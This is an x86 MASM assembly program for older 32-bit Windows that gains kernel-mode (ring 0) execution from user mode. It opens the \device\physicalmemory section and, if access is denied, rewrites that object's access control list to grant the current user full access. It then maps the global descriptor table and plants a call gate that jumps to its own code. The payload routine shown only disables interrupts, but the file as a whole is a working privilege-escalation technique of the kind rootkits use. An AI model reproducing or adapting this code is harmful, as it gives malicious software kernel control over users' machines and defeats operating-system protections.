.386p
.model flat,stdcall
option casemap :none

include \masm32\include\windows.inc 
include \masm32\include\user32.inc
include \masm32\include\kernel32.inc
include \masm32\include\advapi32.inc

includelib \masm32\lib\user32.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\advapi32.lib

include ntdll.inc
includelib ntdll.lib

.data?

    ALIGN   DWORD

        dacl            dd      ?
        nexp            dd      ?

        hPhysicMem      dd      ?

        pSecuDescript   dd      ?

        pOldDacl        dd      ?
        pNewDacl        dd      ?

        unicode_str     dw      ?
                        dw      ?
                        dd      ?

        obj_attrib      dd      ?
                        dd      ?
                        dd      ?
                        dd      ?
                        dd      ?
                        dd      ?

        Exp_Access      dd      ?
                        dd      ?
                        dd      ?

                        dd      ?
                        dd      ?
                        dd      ?
                        dd      ?
                        dd      ?

        gdt             dw      ?
                        dw      ?
                        dw      ?

        pad1            dw      ?

        pAddrgdt        dq      ?

        Callgate        dq      ?
                        dd      ?
                        dd      ?
                        dw      ?
                        dw      ?

        ViewSize        dd      ?

        CgCall          df      ?

        pad2            dw      ?

        udevname        db      62 dup(?)

.const

        modname         db      "Ring0",0

        err1            db      "error",0
        err2            db      "error : access denied",0

        devname         db      "\device\physicalmemory",0

        user            db      "CURRENT_USER",0

.code

Start:

        invoke      MultiByteToWideChar,CP_ACP,MB_PRECOMPOSED,addr devname,-1,addr udevname,30

        .IF eax == 0
            invoke      MessageBox,NULL,addr err1,addr modname,MB_OK
            jmp         fin
        .ENDIF


        invoke      RtlInitUnicodeString,addr unicode_str,addr udevname

        mov         ebx,offset obj_attrib
        mov         dword ptr [ebx],24
        mov         dword ptr [ebx+4],NULL
        mov         dword ptr [ebx+8],offset unicode_str
        mov         dword ptr [ebx+12],OBJ_CASE_INSENSITIVE
        or          dword ptr [ebx+12],OBJ_KERNEL_HANDLE
        mov         dword ptr [ebx+16],NULL
        mov         dword ptr [ebx+20],NULL

        mov         edx,SECTION_MAP_READ
        or          edx,SECTION_MAP_WRITE
        invoke      NtOpenSection,addr hPhysicMem,edx,ebx

        .IF eax != ERROR_SUCCESS
            .IF eax == 0C0000022h
                jmp         needrw
            .ELSE            
                invoke      MessageBox,NULL,addr err1,addr modname,MB_OK
                jmp         fin
            .ENDIF
        .ELSE
            mov         pOldDacl,NULL
            jmp     rw
        .ENDIF

needrw: mov         edx,WRITE_DAC
        or          edx,READ_CONTROL
        invoke      NtOpenSection,addr hPhysicMem,edx,addr obj_attrib

        .IF eax != ERROR_SUCCESS
            .IF eax == 0C0000022h
                invoke      MessageBox,NULL,addr err2,addr modname,MB_OK
                jmp         fin
            .ELSE            
                invoke      MessageBox,NULL,addr err1,addr modname,MB_OK
                jmp         fin
            .ENDIF
        .ENDIF


        invoke      GetSecurityInfo,hPhysicMem,SE_KERNEL_OBJECT,DACL_SECURITY_INFORMATION,NULL,NULL,addr pOldDacl,NULL,addr pSecuDescript

        .IF eax != ERROR_SUCCESS
            invoke      MessageBox,NULL,addr err1,addr modname,MB_OK
            jmp         fin
        .ENDIF

        mov         ebx,offset Exp_Access
        mov         dword ptr [ebx],SECTION_ALL_ACCESS
        mov         dword ptr [ebx+4],GRANT_ACCESS
        mov         dword ptr [ebx+8],NO_INHERITANCE
        mov         dword ptr [ebx+12],NULL
        mov         dword ptr [ebx+16],NO_MULTIPLE_TRUSTEE
        mov         dword ptr [ebx+20],TRUSTEE_IS_NAME
        mov         dword ptr [ebx+24],TRUSTEE_IS_USER
        mov         dword ptr [ebx+28],offset user

        invoke      SetEntriesInAcl,1,addr Exp_Access,pOldDacl,addr pNewDacl

        .IF eax != ERROR_SUCCESS
            invoke      MessageBox,NULL,addr err1,addr modname,MB_OK
            jmp         fin
        .ENDIF


        invoke      SetSecurityInfo,hPhysicMem,SE_KERNEL_OBJECT,DACL_SECURITY_INFORMATION,NULL,NULL,pNewDacl,NULL

        .IF eax != ERROR_SUCCESS
            invoke      MessageBox,NULL,addr err1,addr modname,MB_OK
            jmp         fin
        .ENDIF


        invoke      LocalFree,pNewDacl
noneed: invoke      LocalFree,dacl
        invoke      LocalFree,pSecuDescript
        invoke      NtClose,hPhysicMem
        mov         hPhysicMem,NULL
        mov         edx,SECTION_MAP_READ
        or          edx,SECTION_MAP_WRITE
        invoke      NtOpenSection,addr hPhysicMem,edx,addr obj_attrib

        .IF eax != ERROR_SUCCESS
            .IF eax == 0C0000022h
                invoke      MessageBox,NULL,addr err2,addr modname,MB_OK
                jmp         fin
            .ELSE            
                invoke      MessageBox,NULL,addr err1,addr modname,MB_OK
                jmp         fin
            .ENDIF
        .ENDIF


rw:     sgdt        gdt
        mov         ebx,offset gdt
        movzx       eax,word ptr [ebx+2]
        movzx       edx,word ptr [ebx+4]
        shl         edx,16
        or          edx,eax

        .IF (edx < 80000000h) || (edx >= 0A0000000h)
            and         edx,0FFFF000h
        .ELSE
            and         edx,1FFFF000h
        .ENDIF

        mov         ebx,offset pAddrgdt
        mov         dword ptr [ebx],edx
        mov         dword ptr [ebx+4],0
        mov         dword ptr [ebx+8],edx
        mov         dword ptr [ebx+12],0

        push        PAGE_READWRITE
        push        0
        push        1
        movzx       edx,word ptr gdt
        mov         ViewSize,edx
        push        offset ViewSize
        mov         eax,offset Callgate
        push        eax
        push        edx
        push        0
        add         eax,8
        push        eax
        push        -1
        push        hPhysicMem
        call        NtMapViewOfSection

        .IF eax != ERROR_SUCCESS
            invoke      MessageBox,NULL,addr err1,addr modname,MB_OK
            jmp         fin
        .ENDIF


        mov         ebx,offset Callgate
        mov         dx,word ptr gdt
        and         dx,0FFF8h
        mov         word ptr [ebx+18],dx
        mov         dword ptr [ebx+12],NULL
        movzx       eax,dx
        mov         ecx,[ebx+8]
        add         eax,ecx

        .WHILE eax > ecx
            mov         dl,byte ptr [eax+5]
            and         dl,80h
            jne         @f

            mov         edx,Ring0
            mov         word ptr [eax],dx
            mov         word ptr [eax+2],KGDT_R0_CODE
            mov         byte ptr [eax+4],1
            mov         byte ptr [eax+5],0ECh
            shr         edx,16
            mov         word ptr [eax+6],dx
            mov         dword ptr [ebx+12],eax
            jmp         fwh

@@:         sub         eax,8
        .ENDW

fwh:    mov         edx,[ebx+12]

        .IF edx == NULL
            invoke      MessageBox,NULL,addr err1,addr modname,MB_OK
            jmp         fin
        .ENDIF


        mov         edx,eax
        sub         edx,[ebx+8]
        or          dx,3
        mov         word ptr [ebx+16],dx
        mov         eax,offset CgCall
        mov         dx,word ptr [ebx+16]
        mov         word ptr [eax+4],dx
        mov         dword ptr [eax],0

        push        thend-Ring0
        push        Ring0
        call        VirtualLock

        call        GetCurrentThread
        invoke      SetThreadPriority,eax,THREAD_PRIORITY_TIME_CRITICAL

        invoke      Sleep,0

        push        fs
        push        12345678h
        call        fword ptr [CgCall]

        pop         fs

        call        GetCurrentThread
        invoke      SetThreadPriority,eax,THREAD_PRIORITY_NORMAL

        push        thend-Ring0
        push        Ring0
        call        VirtualUnlock

        mov         ebx,offset Callgate
        mov         edi,[ebx+12]
        xor         eax,eax
        stosd
        stosd

        .IF pOldDacl != NULL
            invoke      SetSecurityInfo,hPhysicMem,SE_KERNEL_OBJECT,DACL_SECURITY_INFORMATION,NULL,NULL,pOldDacl,NULL
        .ENDIF

        invoke      NtUnmapViewOfSection,-1,dword ptr [ebx+8]
        invoke      NtClose,hPhysicMem

fin:    invoke      ExitProcess,0

Ring0 PROC

        pushad
        pushf

cli

        popf
        popad

        retf        4

Ring0 ENDP

thend:

end             Start